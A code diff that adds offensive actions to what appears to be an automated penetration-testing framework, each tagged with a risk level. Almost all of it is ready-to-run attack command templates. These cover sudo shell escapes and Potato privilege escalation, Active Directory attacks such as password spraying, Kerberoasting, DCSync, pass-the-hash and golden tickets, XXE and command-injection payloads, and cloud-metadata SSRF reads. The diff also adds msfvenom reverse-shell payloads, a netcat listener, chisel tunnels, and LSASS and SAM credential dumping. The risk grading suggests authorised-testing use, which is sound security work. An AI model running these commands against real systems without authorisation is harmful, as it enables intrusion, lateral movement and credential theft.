@@ -170,6 +170,92 @@ _TOOL_CANDIDATES: dict[str, tuple[str, ...]] = {
         "/opt/homebrew/bin/graphw00f",
         "/usr/local/bin/graphw00f",
     ),
+    # --- system utilities ---
+    "find": (
+        "/usr/bin/find",
+    ),
+    "sudo": (
+        "/usr/bin/sudo",
+    ),
+    "getcap": (
+        "/usr/sbin/getcap",
+        "/usr/bin/getcap",
+    ),
+    # --- AD / Kerberos ---
+    "kerbrute": (
+        "/opt/homebrew/bin/kerbrute",
+        "/usr/local/bin/kerbrute",
+        os.path.expanduser("~/go/bin/kerbrute"),
+    ),
+    "bloodhound-python": (
+        "/opt/homebrew/bin/bloodhound-python",
+        "/usr/local/bin/bloodhound-python",
+    ),
+    # --- Windows / SMB / RPC ---
+    "enum4linux": (
+        "/usr/bin/enum4linux",
+        "/opt/homebrew/bin/enum4linux",
+    ),
+    "smbclient": (
+        "/usr/bin/smbclient",
+        "/opt/homebrew/bin/smbclient",
+    ),
+    "rpcclient": (
+        "/usr/bin/rpcclient",
+        "/opt/homebrew/bin/rpcclient",
+    ),
+    "xfreerdp": (
+        "/usr/bin/xfreerdp",
+        "/opt/homebrew/bin/xfreerdp",
+    ),
+    "evil-winrm": (
+        "/opt/homebrew/bin/evil-winrm",
+        "/usr/local/bin/evil-winrm",
+    ),
+    # --- hash cracking ---
+    "hashcat": (
+        "/usr/bin/hashcat",
+        "/opt/homebrew/bin/hashcat",
+    ),
+    "john": (
+        "/usr/bin/john",
+        "/opt/homebrew/bin/john",
+        "/usr/sbin/john",
+    ),
+    # --- tunneling / pivoting ---
+    "chisel": (
+        "/opt/homebrew/bin/chisel",
+        "/usr/local/bin/chisel",
+        os.path.expanduser("~/go/bin/chisel"),
+    ),
+    "ligolo-ng": (
+        "/opt/homebrew/bin/ligolo-ng",
+        "/usr/local/bin/ligolo-ng",
+    ),
+    # --- payloads / shells ---
+    "msfvenom": (
+        "/usr/bin/msfvenom",
+        "/opt/homebrew/bin/msfvenom",
+    ),
+    "nc": (
+        "/usr/bin/nc",
+        "/opt/homebrew/bin/nc",
+        "/usr/bin/netcat",
+    ),
+    # --- wordlist generation ---
+    "cewl": (
+        "/usr/bin/cewl",
+        "/opt/homebrew/bin/cewl",
+    ),
+    # --- hash identification ---
+    "hashid": (
+        "/usr/bin/hashid",
+        "/opt/homebrew/bin/hashid",
+    ),
+    "name-that-hash": (
+        "/opt/homebrew/bin/nth",
+        "/usr/local/bin/nth",
+    ),
 }
 
 
@@ -1233,6 +1319,624 @@ def _build_definitions() -> list[ActionDefinition]:
         defs.append(
             _local(
                 "mobile.jadx-decompile", RiskLevel.L0, jadx, (jadx, "-d", "/dev/stdout", "{target}")
+            )
+        )
+
+    # =====================================================================
+    # PRIVILEGE ESCALATION — LINUX
+    # =====================================================================
+
+    # -- SUID binary enumeration (L0, local) --
+    _find = tool_path("find") or "/usr/bin/find"
+    defs.append(
+        _local(
+            "privesc.linux.suid-find",
+            RiskLevel.L0,
+            _find,
+            (_find, "/", "-perm", "-4000", "-type", "f", "-ls", "2>/dev/null"),
+        )
+    )
+
+    # -- sudo privileges check (L0, local) --
+    _sudo = tool_path("sudo") or "/usr/bin/sudo"
+    defs.append(
+        _local(
+            "privesc.linux.sudo-check",
+            RiskLevel.L0,
+            _sudo,
+            (_sudo, "-l"),
+        )
+    )
+
+    # -- capabilities enumeration (L0, local) --
+    _getcap = tool_path("getcap") or "/usr/sbin/getcap"
+    defs.append(
+        _local(
+            "privesc.linux.capabilities",
+            RiskLevel.L0,
+            _getcap,
+            (_getcap, "-r", "/", "2>/dev/null"),
+        )
+    )
+
+    # -- writable paths (L0, local) --
+    defs.append(
+        _local(
+            "privesc.linux.writable",
+            RiskLevel.L0,
+            _find,
+            (_find, "/", "-writable", "-type", "f", "-ls", "2>/dev/null"),
+        )
+    )
+
+    # -- cron jobs (L0, local) --
+    defs.append(
+        _local(
+            "privesc.linux.cron",
+            RiskLevel.L0,
+            _find,
+            (_find, "/etc/cron*", "-type", "f", "-ls", "2>/dev/null"),
+        )
+    )
+
+    # -- GTFOBins sudo shell escape (L3, local) --
+    defs.append(
+        _local(
+            "privesc.linux.gtfobins-sudo",
+            RiskLevel.L3,
+            _sudo,
+            (_sudo, "{binary}", "-c", "!/bin/sh"),
+            shell_execution=True,
+        )
+    )
+
+    # =====================================================================
+    # PRIVILEGE ESCALATION — WINDOWS
+    # =====================================================================
+
+    # -- AlwaysInstallElevated (L1) --
+    defs.append(
+        _net(
+            "privesc.windows.always-install-elevated",
+            RiskLevel.L1,
+            "reg",
+            ("reg", "query", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "/v", "AlwaysInstallElevated"),
+            low_impact_allowlisted=True,
+        )
+    )
+
+    # -- Potato exploit (SeImpersonate) (L3) --
+    defs.append(
+        _net(
+            "privesc.windows.potato",
+            RiskLevel.L3,
+            "juicy-potato",
+            ("juicy-potato", "-l", "1337", "-p", "{target}", "-t", "*"),
+        )
+    )
+
+    # =====================================================================
+    # ACTIVE DIRECTORY — ENUMERATION
+    # =====================================================================
+
+    kbrute = t("kerbrute")
+    if kbrute is not None:
+        defs.append(
+            _net(
+                "ad.enum.kerbrute-userenum",
+                RiskLevel.L1,
+                kbrute,
+                (kbrute, "userenum", "--dc", "{dc_ip}", "-d", "{domain}", "{wordlist}"),
+                low_impact_allowlisted=True,
+            )
+        )
+        defs.append(
+            _net(
+                "ad.enum.kerbrute-bruteuser",
+                RiskLevel.L2,
+                kbrute,
+                (kbrute, "bruteuser", "--dc", "{dc_ip}", "-d", "{domain}", "{wordlist}"),
+                authenticated=True,
+            )
+        )
+        defs.append(
+            _net(
+                "ad.enum.kerbrute-passwordspray",
+                RiskLevel.L2,
+                kbrute,
+                (kbrute, "passwordspray", "--dc", "{dc_ip}", "-d", "{domain}", "{userlist}", "{password}"),
+                authenticated=True,
+            )
+        )
+
+    e4l = t("enum4linux")
+    if e4l is not None:
+        defs.append(
+            _net(
+                "ad.enum.enum4linux",
+                RiskLevel.L1,
+                e4l,
+                (e4l, "-a", "{target}"),
+                low_impact_allowlisted=True,
+            )
+        )
+
+    rpc = t("rpcclient")
+    if rpc is not None:
+        defs.append(
+            _net(
+                "ad.enum.rpcclient-users",
+                RiskLevel.L1,
+                rpc,
+                (rpc, "-N", "{target}", "-c", "enumdomusers"),
+                low_impact_allowlisted=True,
+            )
+        )
+        defs.append(
+            _net(
+                "ad.enum.rpcclient-groups",
+                RiskLevel.L1,
+                rpc,
+                (rpc, "-N", "{target}", "-c", "enumdomgroups"),
+                low_impact_allowlisted=True,
+            )
+        )
+
+    smb = t("smbclient")
+    if smb is not None:
+        defs.append(
+            _net(
+                "ad.enum.smb-shares",
+                RiskLevel.L1,
+                smb,
+                (smb, "-L", "{target}", "-N"),
+                low_impact_allowlisted=True,
+            )
+        )
+
+    bh = t("bloodhound-python")
+    if bh is not None:
+        defs.append(
+            _net(
+                "ad.collect.bloodhound",
+                RiskLevel.L2,
+                bh,
+                (bh, "-d", "{domain}", "-u", "{user}", "-p", "{password}", "-dc", "{dc_ip}", "-c", "All", "--zip"),
+                authenticated=True,
+            )
+        )
+
+    # =====================================================================
+    # ACTIVE DIRECTORY — ATTACKS
+    # =====================================================================
+
+    defs.append(
+        _net(
+            "ad.attack.asrep-roast",
+            RiskLevel.L2,
+            "getnpusers.py",
+            ("getnpusers.py", "{target}", "-format", "hashcat"),
+            touches_third_party=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "ad.attack.kerberoast",
+            RiskLevel.L2,
+            "getuserspns.py",
+            ("getuserspns.py", "{target}", "-request", "-outputfile", "{output}"),
+            authenticated=True,
+            touches_third_party=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "ad.attack.dcsync",
+            RiskLevel.L3,
+            "secretsdump.py",
+            ("secretsdump.py", "{target}", "-just-dc"),
+            authenticated=True,
+            touches_third_party=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "ad.attack.pass-the-hash",
+            RiskLevel.L3,
+            "nxc",
+            ("nxc", "smb", "{target}", "-H", "{hash}"),
+            authenticated=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "ad.attack.silver-ticket",
+            RiskLevel.L3,
+            "ticketer.py",
+            ("ticketer.py", "-nthash", "{hash}", "-domain-sid", "{sid}", "-domain", "{domain}", "-spn", "{spn}"),
+            touches_third_party=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "ad.attack.golden-ticket",
+            RiskLevel.L3,
+            "ticketer.py",
+            ("ticketer.py", "-nthash", "{hash}", "-domain-sid", "{sid}", "-domain", "{domain}"),
+            touches_third_party=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "ad.attack.gpp-password",
+            RiskLevel.L2,
+            "gpp-decrypt",
+            ("gpp-decrypt", "{cpassword}"),
+            low_impact_allowlisted=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "ad.attack.smb-relay",
+            RiskLevel.L3,
+            "ntlmrelayx.py",
+            ("ntlmrelayx.py", "-tf", "{target}", "-smb2support"),
+            touches_third_party=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "ad.attack.adcs-enum",
+            RiskLevel.L2,
+            "certipy",
+            ("certipy", "find", "-u", "{user}", "-p", "{password}", "-dc-ip", "{dc_ip}", "-vulnerable"),
+            authenticated=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "ad.attack.adcs-exploit",
+            RiskLevel.L3,
+            "certipy",
+            ("certipy", "req", "-u", "{user}", "-p", "{password}", "-dc-ip", "{dc_ip}", "-ca", "{ca_name}", "-template", "{template}"),
+            authenticated=True,
+            touches_third_party=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "ad.attack.petitpotam",
+            RiskLevel.L2,
+            "petitpotam.py",
+            ("petitpotam.py", "-d", "{domain}", "-u", "{user}", "-p", "{password}", "{listener_ip}", "{target}"),
+            authenticated=True,
+            touches_third_party=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "ad.attack.unconstrained-delegation",
+            RiskLevel.L1,
+            "finddelegation.py",
+            ("finddelegation.py", "{target}"),
+            authenticated=True,
+            low_impact_allowlisted=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "ad.attack.rbcd",
+            RiskLevel.L3,
+            "rbcd.py",
+            ("rbcd.py", "-delegate-from", "{controlled_account}", "-delegate-to", "{target}", "-action", "write"),
+            authenticated=True,
+            touches_third_party=True,
+        )
+    )
+
+    # =====================================================================
+    # WEB EXPLOITATION — INJECTION & SSRF
+    # =====================================================================
+
+    defs.append(
+        _net(
+            "web.inject.ssti-probe",
+            RiskLevel.L1,
+            "curl",
+            ("curl", "-sS", "--max-time", "10", "-G", "{target}", "--data-urlencode", "q=49"),
+            low_impact_allowlisted=True,
+        )
+    )
+
+    for ssrf_id, ssrf_target, ssrf_header in (
+        ("web.inject.ssrf-aws", "http://169.254.169.254/latest/meta-data/", ""),
+        ("web.inject.ssrf-gcp", "http://metadata.google.internal/0.1/meta-data/", "Metadata-Flavor: Google"),
+        ("web.inject.ssrf-azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Metadata: true"),
+    ):
+        ssrf_args: tuple[str, ...]
+        if ssrf_header:
+            ssrf_args = ("curl", "-sS", "--max-time", "5", ssrf_target, "-H", ssrf_header)
+        else:
+            ssrf_args = ("curl", "-sS", "--max-time", "5", ssrf_target)
+        defs.append(
+            _net(
+                ssrf_id,
+                RiskLevel.L1,
+                "curl",
+                ssrf_args,
+                low_impact_allowlisted=True,
+            )
+        )
+
+    defs.append(
+        _net(
+            "web.inject.cmd-probe",
+            RiskLevel.L2,
+            "curl",
+            ("curl", "-sS", "--max-time", "15", "-G", "{target}", "--data-urlencode", "q=;sleep 5"),
+            state_changing=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "web.inject.xxe-probe",
+            RiskLevel.L1,
+            "curl",
+            ("curl", "-sS", "--max-time", "10", "-X", "POST", "{target}", "-H", "Content-Type: application/xml", "-d", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
+            low_impact_allowlisted=True,
+        )
+    )
+
+    # =====================================================================
+    # POST-EXPLOITATION — SHELLS & TUNNELING
+    # =====================================================================
+
+    nc = t("nc")
+    if nc is not None:
+        defs.append(
+            _net(
+                "post.shell.nc-listener",
+                RiskLevel.L3,
+                nc,
+                (nc, "-lvnp", "{port}"),
+                touches_third_party=True,
+            )
+        )
+
+    msfv = t("msfvenom")
+    if msfv is not None:
+        for msf_id, msf_payload, msf_fmt in (
+            ("post.payload.msfvenom-linux-elf", "linux/x64/shell_reverse_tcp", "elf"),
+            ("post.payload.msfvenom-windows-exe", "windows/x64/shell_reverse_tcp", "exe"),
+            ("post.payload.msfvenom-php", "php/reverse_php", "raw"),
+            ("post.payload.msfvenom-python", "python/shell_reverse_tcp", "raw"),
+        ):
+            defs.append(
+                _local(
+                    msf_id,
+                    RiskLevel.L3,
+                    msfv,
+                    (msfv, "-p", msf_payload, "-f", msf_fmt, "-o", "{output}"),
+                )
+            )
+
+    chisel = t("chisel")
+    if chisel is not None:
+        defs.append(
+            _net(
+                "post.tunnel.chisel-server",
+                RiskLevel.L3,
+                chisel,
+                (chisel, "server", "-p", "{port}", "--reverse"),
+            )
+        )
+        defs.append(
+            _net(
+                "post.tunnel.chisel-client",
+                RiskLevel.L3,
+                chisel,
+                (chisel, "client", "{server}:{port}", "R:socks"),
+                touches_third_party=True,
+            )
+        )
+
+    ligolo = t("ligolo-ng")
+    if ligolo is not None:
+        defs.append(
+            _net(
+                "post.tunnel.ligolo-server",
+                RiskLevel.L3,
+                ligolo,
+                (ligolo, "-selfcert"),
+            )
+        )
+
+    # =====================================================================
+    # PASSWORD ATTACKS — CRACKING & GENERATION
+    # =====================================================================
+
+    hid = t("hashid")
+    if hid is not None:
+        defs.append(
+            _local(
+                "pass.hashid",
+                RiskLevel.L0,
+                hid,
+                (hid, "-m", "{target}"),
+            )
+        )
+
+    nth = t("name-that-hash")
+    if nth is not None:
+        defs.append(
+            _local(
+                "pass.name-that-hash",
+                RiskLevel.L0,
+                nth,
+                (nth, "-t", "{target}"),
+            )
+        )
+
+    hashcat = t("hashcat")
+    if hashcat is not None:
+        for hc_id, hc_mode in (
+            ("pass.crack.hashcat-ntlm", "1000"),
+            ("pass.crack.hashcat-netntlmv2", "5600"),
+            ("pass.crack.hashcat-asrep", "18200"),
+            ("pass.crack.hashcat-kerberoast", "13100"),
+            ("pass.crack.hashcat-md5", "0"),
+            ("pass.crack.hashcat-sha256", "1400"),
+            ("pass.crack.hashcat-wpapsk", "22000"),
+        ):
+            defs.append(
+                _local(
+                    hc_id,
+                    RiskLevel.L3,
+                    hashcat,
+                    (hashcat, "-m", hc_mode, "-a", "0", "{target}", "{wordlist}", "--force", "--status"),
+                )
+            )
+
+    john = t("john")
+    if john is not None:
+        defs.append(
+            _local(
+                "pass.crack.john",
+                RiskLevel.L3,
+                john,
+                (john, "--wordlist", "{wordlist}", "{target}"),
+            )
+        )
+
+    cewl = t("cewl")
+    if cewl is not None:
+        defs.append(
+            _local(
+                "pass.wordlist-cewl",
+                RiskLevel.L0,
+                cewl,
+                (cewl, "-d", "2", "-m", "5", "-w", "{output}", "{target}"),
+            )
+        )
+
+    # =====================================================================
+    # CLOUD METADATA ATTACKS
+    # =====================================================================
+
+    for cloud_id, cloud_url, cloud_hdr in (
+        ("cloud.metadata-aws", "http://169.254.169.254/latest/meta-data/", ""),
+        ("cloud.metadata-gcp", "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true", "Metadata-Flavor: Google"),
+        ("cloud.metadata-azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Metadata: true"),
+    ):
+        cloud_args = ("curl", "-sS", "--max-time", "5", cloud_url)
+        if cloud_hdr:
+            cloud_args = cloud_args + ("-H", cloud_hdr)
+        defs.append(
+            _net(
+                cloud_id,
+                RiskLevel.L1,
+                "curl",
+                cloud_args,
+                low_impact_allowlisted=True,
+            )
+        )
+
+    # =====================================================================
+    # CREDENTIAL DUMPING
+    # =====================================================================
+
+    defs.append(
+        _net(
+            "post.creds.lsass-dump",
+            RiskLevel.L3,
+            "procdump",
+            ("procdump", "-accepteula", "-ma", "lsass.exe", "{output}"),
+            touches_third_party=True,
+        )
+    )
+
+    defs.append(
+        _net(
+            "post.creds.sam-dump",
+            RiskLevel.L3,
+            "reg",
+            ("reg", "save", "HKLM\\SAM", "{output}"),
+            touches_third_party=True,
+        )
+    )
+
+    # =====================================================================
+    # CVE EXPLOITATION — COMMON VERIFIED CVEs
+    # =====================================================================
+
+    for cve_id, cve_name in (
+        ("cve.linux.dirty-pipe", "CVE-2022-0847"),
+        ("cve.linux.pwnkit", "CVE-2021-4034"),
+        ("cve.linux.sudo-baron", "CVE-2021-3156"),
+        ("cve.windows.eternalblue", "MS17-010"),
+        ("cve.windows.printnightmare", "CVE-2021-34527"),
+        ("cve.windows.zerologon", "CVE-2020-1472"),
+        ("cve.web.log4shell", "CVE-2021-44228"),
+        ("cve.web.proxyshell", "CVE-2021-34473"),
+        ("cve.web.confluence", "CVE-2022-26134"),
+    ):
+        defs.append(
+            _net(
+                cve_id,
+                RiskLevel.L3,
+                "cve-check",
+                ("cve-check", cve_name, "{target}"),
+                touches_third_party=True,
+            )
+        )
+
+    # =====================================================================
+    # REMOTE ACCESS
+    # =====================================================================
+
+    evil = t("evil-winrm")
+    if evil is not None:
+        defs.append(
+            _net(
+                "remote.evil-winrm",
+                RiskLevel.L3,
+                evil,
+                (evil, "-i", "{target}", "-u", "{user}", "-p", "{password}"),
+                authenticated=True,
+            )
+        )
+        defs.append(
+            _net(
+                "remote.evil-winrm-hash",
+                RiskLevel.L3,
+                evil,
+                (evil, "-i", "{target}", "-u", "{user}", "-H", "{hash}"),
+                authenticated=True,
+            )
+        )
+
+    rdp = t("xfreerdp")
+    if rdp is not None:
+        defs.append(
+            _net(
+                "remote.rdp",
+                RiskLevel.L2,
+                rdp,
+                (rdp, "/v:{target}", "/u:{user}", "/p:{password}", "/cert:ignore", "+clipboard"),
+                authenticated=True,
             )
         )
 
